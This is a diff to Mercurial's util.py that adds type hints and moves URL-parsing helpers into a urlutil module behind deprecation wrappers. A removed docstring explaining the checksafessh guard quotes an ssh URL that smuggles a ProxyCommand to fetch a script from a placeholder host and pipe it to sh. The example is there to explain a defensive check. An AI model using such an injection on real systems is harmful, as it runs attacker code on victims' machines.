@@ -1,7 +1,7 @@
 # util.py - Mercurial utility functions and platform specific implementations
 #
 #  Copyright 2005 K. Thananchayan <thananck@yahoo.com>
-#  Copyright 2005-2007 Matt Mackall <mpm@selenic.com>
+#  Copyright 2005-2007 Olivia Mackall <olivia@selenic.com>
 #  Copyright 2006 Vadim Gelfer <vadim.gelfer@gmail.com>
 #
 # This software may be used and distributed according to the terms of the
@@ -28,7 +28,6 @@ import os
 import platform as pyplatform
 import re as remod
 import shutil
-import socket
 import stat
 import sys
 import time
@@ -57,7 +56,17 @@ from .utils import (
     hashutil,
     procutil,
     stringutil,
+    urlutil,
 )
+
+if pycompat.TYPE_CHECKING:
+    from typing import (
+        Iterator,
+        List,
+        Optional,
+        Tuple,
+    )
+
 
 base85 = policy.importmod('base85')
 osutil = policy.importmod('osutil')
@@ -133,6 +142,7 @@ username = platform.username
 
 
 def setumask(val):
+    # type: (int) -> None
     ''' updates the umask. used by chg server '''
     if pycompat.iswindows:
         return
@@ -307,7 +317,7 @@ class digestchecker(object):
 
 
 try:
-    buffer = buffer
+    buffer = buffer  # pytype: disable=name-error
 except NameError:
 
     def buffer(sliceable, offset=0, length=None):
@@ -1254,7 +1264,8 @@ class cow(object):
         """call this before writes, return self or a copied new object"""
         if getattr(self, '_copied', 0):
             self._copied -= 1
-            return self.__class__(self)
+            # Function cow.__init__ expects 1 arg(s), got 2 [wrong-arg-count]
+            return self.__class__(self)  # pytype: disable=wrong-arg-count
         return self
 
     def copy(self):
@@ -1285,11 +1296,13 @@ class sortdict(collections.OrderedDict):
 
     if pycompat.ispypy:
         # __setitem__() isn't called as of PyPy 5.8.0
-        def update(self, src):
+        def update(self, src, **f):
             if isinstance(src, dict):
                 src = pycompat.iteritems(src)
             for k, v in src:
                 self[k] = v
+            for k in f:
+                self[k] = f[k]
 
     def insert(self, position, key, value):
         for (i, (k, v)) in enumerate(list(self.items())):
@@ -1395,8 +1408,8 @@ class _lrucachenode(object):
     __slots__ = ('next', 'prev', 'key', 'value', 'cost')
 
     def __init__(self):
-        self.next = None
-        self.prev = None
+        self.next = self
+        self.prev = self
 
         self.key = _notset
         self.value = None
@@ -1435,9 +1448,7 @@ class lrucachedict(object):
     def __init__(self, max, maxcost=0):
         self._cache = {}
 
-        self._head = head = _lrucachenode()
-        head.prev = head
-        head.next = head
+        self._head = _lrucachenode()
         self._size = 1
         self.capacity = max
         self.totalcost = 0
@@ -1542,6 +1553,7 @@ class lrucachedict(object):
         """
         try:
             node = self._cache[k]
+            assert node is not None  # help pytype
             return node.value
         except KeyError:
             if default is _notset:
@@ -1599,6 +1611,9 @@ class lrucachedict(object):
         # Walk the linked list backwards starting at tail node until we hit
         # a non-empty node.
         n = self._head.prev
+
+        assert n is not None  # help pytype
+
         while n.key is _notset:
             n = n.prev
 
@@ -1833,6 +1848,7 @@ if pycompat.ispypy:
 
 
 def pathto(root, n1, n2):
+    # type: (bytes, bytes, bytes) -> bytes
     """return the relative path from one place to another.
     root should use os.sep to separate directories
     n1 should use os.sep to separate directories
@@ -2017,6 +2033,7 @@ _winreservedchars = b':*?"<>|'
 
 
 def checkwinfilename(path):
+    # type: (bytes) -> Optional[bytes]
     r"""Check that the base-relative path is a valid filename on Windows.
     Returns None if the path is ok, or a UI string describing the problem.
 
@@ -2111,6 +2128,7 @@ def makelock(info, pathname):
 
 
 def readlock(pathname):
+    # type: (bytes) -> bytes
     try:
         return readlink(pathname)
     except OSError as why:
@@ -2134,6 +2152,7 @@ def fstat(fp):
 
 
 def fscasesensitive(path):
+    # type: (bytes) -> bool
     """
     Return true if the given path is on a case-sensitive filesystem
 
@@ -2170,10 +2189,11 @@ class _re(object):
     def _checkre2(self):
         global _re2
         global _re2_input
+
+        check_pattern = br'\[([^\[]+)\]'
+        check_input = b'[ui]'
         try:
             # check if match works, see issue3964
-            check_pattern = br'\[([^\[]+)\]'
-            check_input = b'[ui]'
             _re2 = bool(re2.match(check_pattern, check_input))
         except ImportError:
             _re2 = False
@@ -2226,6 +2246,7 @@ _fspathcache = {}
 
 
 def fspath(name, root):
+    # type: (bytes, bytes) -> bytes
     """Get name in the case stored in the filesystem
 
     The name should be relative to root, and be normcase-ed for efficiency.
@@ -2270,6 +2291,7 @@ def fspath(name, root):
 
 
 def checknlink(testfile):
+    # type: (bytes) -> bool
     '''check whether hardlink count reporting works properly'''
 
     # testfile may be open, so we need a separate file for checking to
@@ -2303,8 +2325,9 @@ def checknlink(testfile):
 
 
 def endswithsep(path):
+    # type: (bytes) -> bool
     '''Check path ends with os.sep or os.altsep.'''
-    return (
+    return bool(  # help pytype
         path.endswith(pycompat.ossep)
         or pycompat.osaltsep
         and path.endswith(pycompat.osaltsep)
@@ -2312,6 +2335,7 @@ def endswithsep(path):
 
 
 def splitpath(path):
+    # type: (bytes) -> List[bytes]
     """Split path by os.sep.
     Note that this function does not use os.altsep because this is
     an alternative of simple "xxx.split(os.sep)".
@@ -2540,6 +2564,7 @@ class atomictempfile(object):
 
 
 def unlinkpath(f, ignoremissing=False, rmdir=True):
+    # type: (bytes, bool, bool) -> None
     """unlink and remove the directory if it is empty"""
     if ignoremissing:
         tryunlink(f)
@@ -2554,6 +2579,7 @@ def unlinkpath(f, ignoremissing=False, rmdir=True):
 
 
 def tryunlink(f):
+    # type: (bytes) -> None
     """Attempt to remove a file, ignoring ENOENT errors."""
     try:
         unlink(f)
@@ -2563,6 +2589,7 @@ def tryunlink(f):
 
 
 def makedirs(name, mode=None, notindexed=False):
+    # type: (bytes, Optional[int], bool) -> None
     """recursive directory creation with parent mode inheritance
 
     Newly created directories are marked as "not to be indexed by
@@ -2592,16 +2619,19 @@ def makedirs(name, mode=None, notindexed=False):
 
 
 def readfile(path):
+    # type: (bytes) -> bytes
     with open(path, b'rb') as fp:
         return fp.read()
 
 
 def writefile(path, text):
+    # type: (bytes, bytes) -> None
     with open(path, b'wb') as fp:
         fp.write(text)
 
 
 def appendfile(path, text):
+    # type: (bytes, bytes) -> None
     with open(path, b'ab') as fp:
         fp.write(text)
 
@@ -2763,6 +2793,7 @@ def unitcountfn(*unittable):
 
 
 def processlinerange(fromline, toline):
+    # type: (int, int) -> Tuple[int, int]
     """Check that linerange <fromline>:<toline> makes sense and return a
     0-based range.
 
@@ -2822,10 +2853,12 @@ _eolre = remod.compile(br'\r*\n')
 
 
 def tolf(s):
+    # type: (bytes) -> bytes
     return _eolre.sub(b'\n', s)
 
 
 def tocrlf(s):
+    # type: (bytes) -> bytes
     return _eolre.sub(b'\r\n', s)
 
 
@@ -2889,12 +2922,14 @@ else:
 
 
 def iterlines(iterator):
+    # type: (Iterator[bytes]) -> Iterator[bytes]
     for chunk in iterator:
         for line in chunk.splitlines():
             yield line
 
 
 def expandpath(path):
+    # type: (bytes) -> bytes
     return os.path.expanduser(os.path.expandvars(path))
 
 
@@ -2924,396 +2959,52 @@ def interpolate(prefix, mapping, s, fn=None, escape_prefix=False):
     return r.sub(lambda x: fn(mapping[x.group()[1:]]), s)
 
 
-def getport(port):
-    """Return the port for a given network service.
-
-    If port is an integer, it's returned as is. If it's a string, it's
-    looked up using socket.getservbyname(). If there's no matching
-    service, error.Abort is raised.
-    """
-    try:
-        return int(port)
-    except ValueError:
-        pass
-
-    try:
-        return socket.getservbyname(pycompat.sysstr(port))
-    except socket.error:
-        raise error.Abort(
-            _(b"no port number associated with service '%s'") % port
-        )
+def getport(*args, **kwargs):
+    msg = b'getport(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.getport(*args, **kwargs)
 
 
-class url(object):
-    r"""Reliable URL parser.
-
-    This parses URLs and provides attributes for the following
-    components:
-
-    <scheme>://<user>:<passwd>@<host>:<port>/<path>?<query>#<fragment>
-
-    Missing components are set to None. The only exception is
-    fragment, which is set to '' if present but empty.
-
-    If parsefragment is False, fragment is included in query. If
-    parsequery is False, query is included in path. If both are
-    False, both fragment and query are included in path.
-
-    See http://www.ietf.org/rfc/rfc2396.txt for more information.
-
-    Note that for backward compatibility reasons, bundle URLs do not
-    take host names. That means 'bundle://../' has a path of '../'.
-
-    Examples:
-
-    >>> url(b'http://www.ietf.org/rfc/rfc2396.txt')
-    <url scheme: 'http', host: 'www.ietf.org', path: 'rfc/rfc2396.txt'>
-    >>> url(b'ssh://[::1]:2200//home/joe/repo')
-    <url scheme: 'ssh', host: '[::1]', port: '2200', path: '/home/joe/repo'>
-    >>> url(b'file:///home/joe/repo')
-    <url scheme: 'file', path: '/home/joe/repo'>
-    >>> url(b'file:///c:/temp/foo/')
-    <url scheme: 'file', path: 'c:/temp/foo/'>
-    >>> url(b'bundle:foo')
-    <url scheme: 'bundle', path: 'foo'>
-    >>> url(b'bundle://../foo')
-    <url scheme: 'bundle', path: '../foo'>
-    >>> url(br'c:\foo\bar')
-    <url path: 'c:\\foo\\bar'>
-    >>> url(br'\\blah\blah\blah')
-    <url path: '\\\\blah\\blah\\blah'>
-    >>> url(br'\\blah\blah\blah#baz')
-    <url path: '\\\\blah\\blah\\blah', fragment: 'baz'>
-    >>> url(br'file:///C:\users\me')
-    <url scheme: 'file', path: 'C:\\users\\me'>
-
-    Authentication credentials:
-
-    >>> url(b'ssh://joe:xyz@x/repo')
-    <url scheme: 'ssh', user: 'joe', passwd: 'xyz', host: 'x', path: 'repo'>
-    >>> url(b'ssh://joe@x/repo')
-    <url scheme: 'ssh', user: 'joe', host: 'x', path: 'repo'>
-
-    Query strings and fragments:
-
-    >>> url(b'http://host/a?b#c')
-    <url scheme: 'http', host: 'host', path: 'a', query: 'b', fragment: 'c'>
-    >>> url(b'http://host/a?b#c', parsequery=False, parsefragment=False)
-    <url scheme: 'http', host: 'host', path: 'a?b#c'>
-
-    Empty path:
-
-    >>> url(b'')
-    <url path: ''>
-    >>> url(b'#a')
-    <url path: '', fragment: 'a'>
-    >>> url(b'http://host/')
-    <url scheme: 'http', host: 'host', path: ''>
-    >>> url(b'http://host/#a')
-    <url scheme: 'http', host: 'host', path: '', fragment: 'a'>
-
-    Only scheme:
-
-    >>> url(b'http:')
-    <url scheme: 'http'>
-    """
-
-    _safechars = b"!~*'()+"
-    _safepchars = b"/!~*'()+:\\"
-    _matchscheme = remod.compile(b'^[a-zA-Z0-9+.\\-]+:').match
-
-    def __init__(self, path, parsequery=True, parsefragment=True):
-        # We slowly chomp away at path until we have only the path left
-        self.scheme = self.user = self.passwd = self.host = None
-        self.port = self.path = self.query = self.fragment = None
-        self._localpath = True
-        self._hostport = b''
-        self._origpath = path
-
-        if parsefragment and b'#' in path:
-            path, self.fragment = path.split(b'#', 1)
-
-        # special case for Windows drive letters and UNC paths
-        if hasdriveletter(path) or path.startswith(b'\\\\'):
-            self.path = path
-            return
-
-        # For compatibility reasons, we can't handle bundle paths as
-        # normal URLS
-        if path.startswith(b'bundle:'):
-            self.scheme = b'bundle'
-            path = path[7:]
-            if path.startswith(b'//'):
-                path = path[2:]
-            self.path = path
-            return
-
-        if self._matchscheme(path):
-            parts = path.split(b':', 1)
-            if parts[0]:
-                self.scheme, path = parts
-                self._localpath = False
-
-        if not path:
-            path = None
-            if self._localpath:
-                self.path = b''
-                return
-        else:
-            if self._localpath:
-                self.path = path
-                return
-
-            if parsequery and b'?' in path:
-                path, self.query = path.split(b'?', 1)
-                if not path:
-                    path = None
-                if not self.query:
-                    self.query = None
-
-            # // is required to specify a host/authority
-            if path and path.startswith(b'//'):
-                parts = path[2:].split(b'/', 1)
-                if len(parts) > 1:
-                    self.host, path = parts
-                else:
-                    self.host = parts[0]
-                    path = None
-                if not self.host:
-                    self.host = None
-                    # path of file:///d is /d
-                    # path of file:///d:/ is d:/, not /d:/
-                    if path and not hasdriveletter(path):
-                        path = b'/' + path
-
-            if self.host and b'@' in self.host:
-                self.user, self.host = self.host.rsplit(b'@', 1)
-                if b':' in self.user:
-                    self.user, self.passwd = self.user.split(b':', 1)
-                if not self.host:
-                    self.host = None
-
-            # Don't split on colons in IPv6 addresses without ports
-            if (
-                self.host
-                and b':' in self.host
-                and not (
-                    self.host.startswith(b'[') and self.host.endswith(b']')
-                )
-            ):
-                self._hostport = self.host
-                self.host, self.port = self.host.rsplit(b':', 1)
-                if not self.host:
-                    self.host = None
-
-            if (
-                self.host
-                and self.scheme == b'file'
-                and self.host not in (b'localhost', b'127.0.0.1', b'[::1]')
-            ):
-                raise error.Abort(
-                    _(b'file:// URLs can only refer to localhost')
-                )
-
-        self.path = path
-
-        # leave the query string escaped
-        for a in (b'user', b'passwd', b'host', b'port', b'path', b'fragment'):
-            v = getattr(self, a)
-            if v is not None:
-                setattr(self, a, urlreq.unquote(v))
-
-    @encoding.strmethod
-    def __repr__(self):
-        attrs = []
-        for a in (
-            b'scheme',
-            b'user',
-            b'passwd',
-            b'host',
-            b'port',
-            b'path',
-            b'query',
-            b'fragment',
-        ):
-            v = getattr(self, a)
-            if v is not None:
-                attrs.append(b'%s: %r' % (a, pycompat.bytestr(v)))
-        return b'<url %s>' % b', '.join(attrs)
-
-    def __bytes__(self):
-        r"""Join the URL's components back into a URL string.
-
-        Examples:
-
-        >>> bytes(url(b'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'))
-        'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'
-        >>> bytes(url(b'http://user:pw@host:80/?foo=bar&baz=42'))
-        'http://user:pw@host:80/?foo=bar&baz=42'
-        >>> bytes(url(b'http://user:pw@host:80/?foo=bar%3dbaz'))
-        'http://user:pw@host:80/?foo=bar%3dbaz'
-        >>> bytes(url(b'ssh://user:pw@[::1]:2200//home/joe#'))
-        'ssh://user:pw@[::1]:2200//home/joe#'
-        >>> bytes(url(b'http://localhost:80//'))
-        'http://localhost:80//'
-        >>> bytes(url(b'http://localhost:80/'))
-        'http://localhost:80/'
-        >>> bytes(url(b'http://localhost:80'))
-        'http://localhost:80/'
-        >>> bytes(url(b'bundle:foo'))
-        'bundle:foo'
-        >>> bytes(url(b'bundle://../foo'))
-        'bundle:../foo'
-        >>> bytes(url(b'path'))
-        'path'
-        >>> bytes(url(b'file:///tmp/foo/bar'))
-        'file:///tmp/foo/bar'
-        >>> bytes(url(b'file:///c:/tmp/foo/bar'))
-        'file:///c:/tmp/foo/bar'
-        >>> print(url(br'bundle:foo\bar'))
-        bundle:foo\bar
-        >>> print(url(br'file:///D:\data\hg'))
-        file:///D:\data\hg
-        """
-        if self._localpath:
-            s = self.path
-            if self.scheme == b'bundle':
-                s = b'bundle:' + s
-            if self.fragment:
-                s += b'#' + self.fragment
-            return s
-
-        s = self.scheme + b':'
-        if self.user or self.passwd or self.host:
-            s += b'//'
-        elif self.scheme and (
-            not self.path
-            or self.path.startswith(b'/')
-            or hasdriveletter(self.path)
-        ):
-            s += b'//'
-            if hasdriveletter(self.path):
-                s += b'/'
-        if self.user:
-            s += urlreq.quote(self.user, safe=self._safechars)
-        if self.passwd:
-            s += b':' + urlreq.quote(self.passwd, safe=self._safechars)
-        if self.user or self.passwd:
-            s += b'@'
-        if self.host:
-            if not (self.host.startswith(b'[') and self.host.endswith(b']')):
-                s += urlreq.quote(self.host)
-            else:
-                s += self.host
-        if self.port:
-            s += b':' + urlreq.quote(self.port)
-        if self.host:
-            s += b'/'
-        if self.path:
-            # TODO: similar to the query string, we should not unescape the
-            # path when we store it, the path might contain '%2f' = '/',
-            # which we should *not* escape.
-            s += urlreq.quote(self.path, safe=self._safepchars)
-        if self.query:
-            # we store the query in escaped form.
-            s += b'?' + self.query
-        if self.fragment is not None:
-            s += b'#' + urlreq.quote(self.fragment, safe=self._safepchars)
-        return s
-
-    __str__ = encoding.strmethod(__bytes__)
-
-    def authinfo(self):
-        user, passwd = self.user, self.passwd
-        try:
-            self.user, self.passwd = None, None
-            s = bytes(self)
-        finally:
-            self.user, self.passwd = user, passwd
-        if not self.user:
-            return (s, None)
-        # authinfo[1] is passed to urllib2 password manager, and its
-        # URIs must not contain credentials. The host is passed in the
-        # URIs list because Python < 2.4.3 uses only that to search for
-        # a password.
-        return (s, (None, (s, self.host), self.user, self.passwd or b''))
-
-    def isabs(self):
-        if self.scheme and self.scheme != b'file':
-            return True  # remote URL
-        if hasdriveletter(self.path):
-            return True  # absolute for our purposes - can't be joined()
-        if self.path.startswith(br'\\'):
-            return True  # Windows UNC path
-        if self.path.startswith(b'/'):
-            return True  # POSIX-style
-        return False
-
-    def localpath(self):
-        if self.scheme == b'file' or self.scheme == b'bundle':
-            path = self.path or b'/'
-            # For Windows, we need to promote hosts containing drive
-            # letters to paths with drive letters.
-            if hasdriveletter(self._hostport):
-                path = self._hostport + b'/' + self.path
-            elif (
-                self.host is not None and self.path and not hasdriveletter(path)
-            ):
-                path = b'/' + path
-            return path
-        return self._origpath
-
-    def islocal(self):
-        '''whether localpath will return something that posixfile can open'''
-        return (
-            not self.scheme
-            or self.scheme == b'file'
-            or self.scheme == b'bundle'
-        )
+def url(*args, **kwargs):
+    msg = b'url(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.url(*args, **kwargs)
 
 
-def hasscheme(path):
-    return bool(url(path).scheme)
+def hasscheme(*args, **kwargs):
+    msg = b'hasscheme(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.hasscheme(*args, **kwargs)
 
 
-def hasdriveletter(path):
-    return path and path[1:2] == b':' and path[0:1].isalpha()
+def hasdriveletter(*args, **kwargs):
+    msg = b'hasdriveletter(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.hasdriveletter(*args, **kwargs)
 
 
-def urllocalpath(path):
-    return url(path, parsequery=False, parsefragment=False).localpath()
+def urllocalpath(*args, **kwargs):
+    msg = b'urllocalpath(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.urllocalpath(*args, **kwargs)
 
 
-def checksafessh(path):
-    """check if a path / url is a potentially unsafe ssh exploit (SEC)
-
-    This is a sanity check for ssh urls. ssh will parse the first item as
-    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
-    Let's prevent these potentially exploited urls entirely and warn the
-    user.
-
-    Raises an error.Abort when the url is unsafe.
-    """
-    path = urlreq.unquote(path)
-    if path.startswith(b'ssh://-') or path.startswith(b'svn+ssh://-'):
-        raise error.Abort(
-            _(b'potentially unsafe url: %r') % (pycompat.bytestr(path),)
-        )
+def checksafessh(*args, **kwargs):
+    msg = b'checksafessh(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.checksafessh(*args, **kwargs)
 
 
-def hidepassword(u):
-    '''hide user credential in a url string'''
-    u = url(u)
-    if u.passwd:
-        u.passwd = b'***'
-    return bytes(u)
+def hidepassword(*args, **kwargs):
+    msg = b'hidepassword(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.hidepassword(*args, **kwargs)
 
 
-def removeauth(u):
-    '''remove all authentication information from a url string'''
-    u = url(u)
-    u.user = u.passwd = None
-    return bytes(u)
+def removeauth(*args, **kwargs):
+    msg = b'removeauth(...) moved to mercurial.utils.urlutil'
+    nouideprecwarn(msg, b'6.0', stacklevel=2)
+    return urlutil.removeauth(*args, **kwargs)
 
 
 timecount = unitcountfn(
@@ -3415,6 +3106,7 @@ _sizeunits = (
 
 
 def sizetoint(s):
+    # type: (bytes) -> int
     """Convert a space specifier to a byte count.
 
     >>> sizetoint(b'30')
@@ -3640,6 +3332,7 @@ def with_lc_ctype():
 
 
 def _estimatememory():
+    # type: () -> Optional[int]
     """Provide an estimate for the available system memory in Bytes.
 
     If no estimate can be provided on the platform, returns None.
@@ -3647,7 +3340,12 @@ def _estimatememory():
     if pycompat.sysplatform.startswith(b'win'):
         # On Windows, use the GlobalMemoryStatusEx kernel function directly.
         from ctypes import c_long as DWORD, c_ulonglong as DWORDLONG
-        from ctypes.wintypes import Structure, byref, sizeof, windll
+        from ctypes.wintypes import (  # pytype: disable=import-error
+            Structure,
+            byref,
+            sizeof,
+            windll,
+        )
 
         class MEMORYSTATUSEX(Structure):
             _fields_ = [
